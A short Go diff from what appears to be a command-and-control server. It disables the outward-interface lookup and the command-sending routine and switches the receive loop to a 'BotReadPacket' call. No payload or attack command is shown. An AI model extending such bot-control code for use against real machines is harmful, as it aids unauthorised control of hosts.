@@ -73,16 +73,17 @@ func main() {
 	listen := make(chan Host)
 
 	// Iface and src ip for the sendcommand func to use
-	iface, src := cattails.GetOutwardIface("8.8.8.8:80")
+	// iface, src := cattails.GetOutwardIface("8.8.8.8:80")
 
 	// Spawn routine to listen for responses
 	fmt.Println("Starting go routine...")
-	go sendCommand(sendfd, iface, src, listen)
+	// go sendCommand(sendfd, iface, src, listen)
 	fmt.Println("SendCommand routine started")
 	fmt.Println("Entering recieve loop")
 
 	for {
-		packet := cattails.ServerReadPacket(readfd, vm)
+		// packet := cattails.ServerReadPacket(readfd, vm)
+		packet := cattails.BotReadPacket(readfd, vm)
 		// Yeet over to processing function
 		if packet != nil {
 			go serverProcessPacket(packet, listen)
